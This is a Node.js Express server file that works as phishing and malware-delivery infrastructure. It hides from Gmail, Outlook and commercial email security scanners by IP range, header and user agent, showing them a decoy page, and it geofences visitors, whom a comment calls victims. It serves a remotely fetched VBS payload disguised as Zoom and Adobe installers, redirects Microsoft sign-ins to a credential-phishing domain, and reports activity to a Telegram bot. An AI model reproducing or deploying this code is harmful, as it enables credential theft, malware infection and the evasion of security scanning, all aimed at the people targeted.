// express_protected_server_with_telegram_logging.js
const express = require('express');
const app = express();
const path = require('path');
const helmet = require('helmet');
const geoip = require('geoip-lite');
const rateLimit = require('express-rate-limit');
const axios = require('axios');
require('dotenv').config();

// const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

// ======= Config / Env =======
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const TARGET_COUNTRY = process.env.TARGET_COUNTRY || ''; // e.g., 'US'
const DOMAIN = process.env.DOMAIN || '';
const FANTA = process.env.FANTA || '';

const requestTimestamps = new Map();


// ======= Telegram Logging =======
async function sendTelegramMessage(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text
    }, {
      timeout: 5000,
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    console.log('⚠️ Telegram error (non-critical):', err.message || 'failed');
  }
}

function log(level, meta = {}) {
  const icons = {
    info: "🟢",
    warn: "🟡",
    error: "🔴",
    success: "✅"
  };

  const text = [
    `${icons[level] || "ℹ️"} ${level.toUpperCase()} • ${meta.event || "unknown"}`,
    "",
    meta.ip && `🌐 IP: ${meta.ip}`,
    meta.country && `🌍 Country: ${meta.country}`,
    meta.path && `📄 Path: ${meta.path}`,
    meta.type && `📦 Type: ${meta.type}`,
    meta.filename && `📁 File: ${meta.filename}`,
    meta.size && `📏 Size: ${meta.size.toLocaleString()} bytes`,
    meta.reason && `⚠️ Reason: ${meta.reason}`,
    meta.docId && `🆔 Document: ${meta.docId}`,
    meta.ua && `🖥️ UA: ${meta.ua.slice(0, 150)}`,
    "",
    `🕒 ${new Date().toLocaleString()}`
  ]
    .filter(Boolean)
    .join("\n");

  sendTelegramMessage(text).catch(console.error);

  console.log(
    `[${level}] ${meta.event} | ${meta.ip || "-"} | ${meta.path || meta.filename || ""}`
  );
}

// ======= Rate limiter =======
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: 'Too many requests from this network.',
});

const apiLimiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 15,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    log('warn', { event: 'api_rate_limited', ip: req.ip, reason: 'api rate limit' });
    res.status(429).json({ error: 'API rate limit exceeded' });
  }
});

// ======= Scanner Detection =======

// Google's IP ranges (Gmail scanners, Googlebot, CBL fetches)
const GOOGLE_IP_RANGES = [
  '66.102.', '64.233.', '72.14.', '216.239.',
  '209.85.', '74.125.', '173.194.', '142.250.',
  '35.190.', '35.191.', '35.192.', '35.193.',
  '35.194.', '35.195.', '35.196.', '35.197.',
  '35.198.', '35.199.', '35.200.', '35.201.',
  '35.202.', '35.203.', '35.204.', '35.205.',
  '35.206.', '35.207.', '35.208.', '35.209.',
  '35.210.', '35.211.', '35.212.', '35.213.',
  '35.214.', '35.215.', '35.216.', '35.217.',
  '35.218.', '35.219.', '35.220.', '35.221.',
  '35.222.', '35.223.', '35.224.', '35.225.',
  '35.226.', '35.227.', '35.228.', '35.229.',
  '35.230.', '35.231.', '35.232.', '35.233.',
  '35.234.', '35.235.', '35.236.', '35.237.',
  '35.238.', '35.239.', '35.240.', '35.241.',
  '35.242.', '35.243.', '35.244.', '35.245.',
  '35.246.', '35.247.', '35.248.', '35.249.',
  '35.250.', '35.251.', '35.252.', '35.253.',
  '35.254.', '35.255.',
  // Microsoft/Outlook scanners
  '40.126.', '40.97.', '52.96.', '40.95.',
  '104.47.', '52.100.', '52.101.', '52.102.'
];

// Known email security scanner IPs (abridged — expand as needed)
const SCANNER_IP_RANGES = [
  // Proofpoint
  '69.164.', '68.232.',
  // Mimecast
  '91.220.', '195.130.',
  // Zscaler
  '213.152.', '185.46.',
  // VirusTotal
  '74.125.', // VT uses Google infra
];

// Email security proxy headers
const SCANNER_HEADERS = [
  'x-appengine-country',    // Gmail
  'x-proofpoint',           // Proofpoint
  'x-mimecast',             // Mimecast
  'x-forcepoint',           // Forcepoint
  'x-zscaler',              // Zscaler
  'x-barracuda',            // Barracuda
  'x-sophos',               // Sophos
  'x-trendmicro'            // Trend Micro
];

// Scanner User-Agent patterns (aggressive — includes real browser patterns used by scanners)
const SCANNER_UA_PATTERNS = [
  'googlebot', 'google-image-proxy', 'google-safety',
  'virustotal', 'urlscan', 'phrasescan',
  'censys', 'shodan', 'qualys', 'nessus',
  'acunetix', 'nikto', 'sqlmap',
  'python-requests', 'python-urllib', 'curl/', 'wget/',
  'go-http-client', 'node-fetch',
  'headlesschrome', 'headlessfirefox', 'phantomjs',
  'puppeteer', 'selenium', 'playwright', 'webdriver',
  'uptimerobot', 'pingdom',
  'safelinks', 'proofpoint', 'mimecast',
  'zscaler', 'forcepoint', 'barracuda',
  'facebookexternalhit', 'twitterbot',
  'slackbot', 'discordbot', 'telegrambot',
  'whatsapp', 'linkedinbot'
];

// function getClientIp(req) {
//   return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
//          req.headers['x-real-ip'] ||
//          req.ip ||
//          req.connection?.remoteAddress ||
//          '0.0.0.0';
// }

function getClientIp(req) {
    return req.ip || '0.0.0.0';
}

// ======= Whitelist Check =======
function isWhitelisted(req) {
    const ip = getClientIp(req);
    
    // Local dev
    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) return true;
    
    // Direct navigation (victim from email link) — let through if not scanner
    const referer = req.get('Referer') || '';
    if (!referer) return false; // Let it fall through to scanner check
    
    // Click from own domain (multi-page flow)
if (DOMAIN && referer.includes(DOMAIN)) return true;
    return false;
}

function isEmailScanner(req) {
  const ip = getClientIp(req);
  const ua = (req.get('User-Agent') || '').toLowerCase();

  // 1. Check Google IP ranges (catches Gmail's scanner with real browser UAs)
  const isGoogleIp = GOOGLE_IP_RANGES.some(range => ip.startsWith(range));
  if (isGoogleIp) return true;

  // 2. Check other scanner IP ranges
  const isScannerIp = SCANNER_IP_RANGES.some(range => ip.startsWith(range));
  if (isScannerIp) return true;

  // 3. Check for email security proxy headers
  const hasScannerHeader = SCANNER_HEADERS.some(header => !!req.headers[header]);
  if (hasScannerHeader) return true;

  // 4. Check UA patterns
  if (SCANNER_UA_PATTERNS.some(pattern => ua.includes(pattern))) return true;

  // 5. Empty or extremely short UA
  if (!ua || ua.length < 10) return true;

  // // 6. Missing critical browser headers (common in automated scanners)
  // const accept = req.get('Accept');
  // const acceptLang = req.get('Accept-Language');
  // if (!accept || !acceptLang) return true;

  // // 7. Accept header doesn't include text/html (scanners often send */*)
  // if (accept && !accept.includes('text/html')) return true;

  return false;
}

// ======= Geolocation check =======
function isTargetCountry(req) {
  if (!TARGET_COUNTRY) return true;

  const geo = geoip.lookup(getClientIp(req));

  if (!geo) return true; // allow unknown

  return geo.country === TARGET_COUNTRY;
}

// ======= Middleware =======
app.set('trust proxy', 1);
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use('/images', express.static(path.join(__dirname, 'pages', 'images')));
app.use(globalLimiter);
app.use(helmet({ 
  contentSecurityPolicy: false,
  // Don't set X-Frame-Options too aggressively — might look more legit
  frameguard: { action: 'sameorigin' }
}));

app.use((req, res, next) => {
  const ip = getClientIp(req);
  const ua = req.get('User-Agent') || '';
  const path = req.path;

  // Skip health check and static assets
  if (path === '/health' || path.match(/\.(css|js|png|jpg|ico|svg|woff2?|ttf)$/i)) {
    return next();
  }

    // If whitelisted, skip scanner detection
  if (isWhitelisted(req)) {
    return next();
  }

  // Log all requests
  // log('info', { event: 'request', ip, ua: ua.slice(0, 200), path });

  // CRITICAL: Block email scanners
  if (isEmailScanner(req)) {
    log('warn', { event: 'scanner_blocked', ip, ua: ua.slice(0, 200), path, reason: 'email_scanner_detected' });
    
    // Serve a completely benign, static HTML page — NO redirect, NO JS
    return res.status(200).send(`<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Document</title></head>
<body>
  <h1>Document Not Available</h1>
  <p>This document has expired or been removed by the author.</p>
  <p>Please contact the sender for an updated copy.</p>
</body>
</html>`);
  }

  // Geolocation filter
  if (!isTargetCountry(req)) {
    log('warn', { event: 'geo_blocked', ip, path });
    return res.status(200).send(`<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Access Restricted</title></head>
<body>
  <h1>Access Restricted</h1>
  <p>This content is not available in your region.</p>
</body>
</html>`);
  }

  next();
});


// ======= VBS Download Proxy =======
app.get('/download/vbs/:type/:docId', apiLimiter, async (req, res) => {
    try {
        const { type } = req.params;
        const { docId } = req.params;  
        const FANTA = process.env.FANTA || '';
        
        
        const response = await fetch(FANTA);
        const data = await response.text();
        
        // Dynamic filename based on type
        let filename;
        switch(type) {
            case 'workplace':
                filename = 'Zoom_Workplace_Setup.vbs';
                break;
            case 'browser':
                filename = 'Zoom_Browser_Setup.vbs';
                break;
            case 'adobe':
                filename = 'Adobev2T1_Setup.vbs';
                break;    
            default:
                filename = 'Zoom_Workplace.vbs';
        }
        
        // Set proper download headers with dynamic filename
        res.setHeader('Content-Type', 'application/octet-stream');
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.setHeader('Content-Length', Buffer.byteLength(data));

        log('info', { 
            event: 'vbs_download', 
            type: type,
            filename: filename,
            ip: getClientIp(req),
            docId: docId,
            size: Buffer.byteLength(data)
        });
        
        res.send(data);

        
    } catch (error) {
        log('error', { 
            event: 'vbs_download_failed', 
            ip: getClientIp(req), 
            reason: error.message 
        });
        res.status(500).send('Download failed');
    }
});

// ======= Routes =======
app.get('/', (req, res) => {
  return res.sendFile(path.join(__dirname, 'pages', 'index.html'));
});

app.get('/zoom/:zoomId', (req, res) => {
  log('info', { event: 'serve_zoom', ip: getClientIp(req), docId: req.params.zoomId });
  return res.sendFile(path.join(__dirname, 'pages', 'zoom.html'));
});

app.get('/download/id/:fileId', (req, res) => {
  return res.sendFile(path.join(__dirname, 'pages', 'file.html'));
});

app.get('/documents/:docId', (req, res) => {
  log('info', { event: 'serve_preapproval', ip: getClientIp(req), docId: req.params.docId });
  return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
});

app.get('/rsvp/:docId', (req, res) => {
  log('info', { event: 'serve_rsvp', ip: getClientIp(req), docId: req.params.docId });
  return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
});

app.get('/contract/:docId', (req, res) => {
  log('info', { event: 'serve_contract', ip: getClientIp(req), docId: req.params.docId });
  return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
});

app.post('/documents/verify', apiLimiter, (req, res) => {
  const { provider } = req.body || {};
  if (!provider || !['google', 'microsoft'].includes(provider)) {
    return res.status(400).json({ success: false });
  }
  
  const testingUrls = {
    google: 'https://mail.google.com/',
    microsoft: 'https://login.e3h3ud2u.shop/TfKVxpEJ'
  };
  
  log('info', { event: 'auth_verify', ip: getClientIp(req), provider });
  return res.redirect(testingUrls[provider]);
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: Date.now() });
});

// ======= Error handling =======
app.use((err, req, res, next) => {
  log('error', { event: 'internal_error', ip: getClientIp(req), reason: err?.message });
  res.status(500).send('Internal Server Error');
});

// ======= Start server =======
// app.listen(PORT, "0.0.0.0",() => {
//   console.log(`🚀 Server running on http://localhost:${PORT}`);
//   //  try { log('info', { event: 'server_started', port: PORT }); } catch {}
// });


app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server listening on 0.0.0.0:${PORT}`);
  console.log(`Environment PORT: ${process.env.PORT}`);
});
